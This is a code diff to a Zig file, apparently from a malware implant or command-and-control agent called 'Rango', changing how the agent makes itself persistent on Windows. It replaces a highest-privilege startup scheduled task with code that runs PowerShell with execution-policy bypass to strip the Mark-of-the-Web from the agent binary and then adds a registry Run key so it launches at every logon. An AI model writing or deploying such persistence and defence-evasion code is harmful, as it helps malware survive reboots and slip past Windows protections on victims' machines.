@@ -261,16 +261,39 @@ pub const PersistUtils = struct {
             if (reg_exists and std.mem.indexOf(u8, existing.stdout, agent_path) != null) {
                 return error.AlreadyPersistent;
             }
-            const cmd = try std.fmt.allocPrint(allocator,
-                "schtasks /Create /SC ONSTART /TN Rango /TR \"{s}\" /RL HIGHEST /F",
+
+            const unblock_cmd = try std.fmt.allocPrint(
+                allocator,
+                "Unblock-File -Path \"{s}\"",
                 .{agent_path});
-            defer allocator.free(cmd);
-            const result = std.process.Child.run(.{
+            defer allocator.free(unblock_cmd);
+            const remove_motw = try std.process.Child.run(.{
                 .allocator = allocator,
-                .argv = &.{ "cmd.exe", "/C", cmd },
-            }) catch |err| {
-                return err;
-            };
+                .argv = &.{
+                    "powershell",
+                    "-NoProfile",
+                    "-ExecutionPolicy",
+                    "Bypass",
+                    "-Command",
+                    unblock_cmd
+                },
+            });
+
+            if (remove_motw.term.Exited != 0) {
+                return error.UnblockFileFailed;
+            }
+            const result = try std.process.Child.run(.{
+                .allocator = allocator,
+                .argv = &.{
+                    "reg.exe",
+                    "add",
+                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    "/v", "Rango",
+                    "/d", try std.fmt.allocPrint(allocator, "\"{s}\"", .{agent_path}),
+                    "/f",
+                },
+            });
+
             if (result.term.Exited != 0) {
                 return error.SchtasksCreateFailed;
             }
